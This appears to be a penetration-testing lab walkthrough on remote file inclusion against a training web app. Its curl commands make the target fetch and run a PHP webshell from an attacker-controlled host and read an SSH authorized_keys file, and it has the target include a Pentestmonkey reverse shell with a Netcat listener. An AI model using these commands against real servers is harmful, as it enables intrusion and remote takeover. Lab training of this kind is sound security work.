1. Follow the steps from this section to leverage RFI to remotely include the **/usr/share/webshells/php/simple-backdoor.php** PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the **cat** command to view the contents of the **authorized_keys** file in the **/home/elaine/.ssh/** directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.

```bash
# Setting a Python web server
python -m http.server 80

# Accessing the remote file
curl "http://mountaindesserts.com/meteor/index.php?page=http%3A%2F%2F192%2E168%2E45%2E181%3A80%2Fbackdoor%2Ephp&cmd=cat%20%2Fhome%2Felaine%2F%2Essh%2Fauthorized%5Fkeys"
curl "http://mountaindesserts.com/meteor/index.php?page=http%3A%2F%2F192%2E168%2E45%2E181%3A80%2Fjojo%2Etxt"

curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.181/simple-backdoor.php&cmd=ls"

```


2. Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey's Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on VM #2 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.


```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.181/monkey_reverse_shell.php"
```